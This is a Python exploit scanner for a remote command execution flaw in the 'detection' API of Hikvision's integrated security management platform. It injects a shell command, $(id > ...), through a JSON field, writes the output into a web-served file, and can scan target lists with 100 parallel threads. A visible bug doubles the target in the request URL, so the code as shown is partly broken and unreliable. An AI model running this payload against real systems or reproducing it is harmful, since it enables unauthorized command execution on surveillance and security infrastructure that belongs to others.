import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="海康威视综合安防管理平台detection接口处存在前台远程命令执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = target + '/center/api/installation/detection'
    headers ={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Connection': 'close',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/json;charset=UTF-8',
        'Content-Length': '148'
    }
    data='{"type": "environment", "operate": "", "machines": {"id": "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}'

    try:  
        # 尝试发送 POST 请求，并设置超时  
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False,timeout=20)  
        if res1.status_code == 200 and 'uid' in res1.text:  
            with open('result.txt', 'a', encoding='utf-8') as fp:  
                fp.write(f'[+]{target} 存在命令执行漏洞\n') 
                print(f"[+]{target}存在命令执行漏洞") 
        else:  
            print(f"[-]对 {target} 不存在命令执行漏洞: {res1.status_code}")  
    
    except requests.exceptions.RequestException as e:  
        print(f"请求 {target} 失败: {e}") 

if __name__ == '__main__':
    main()
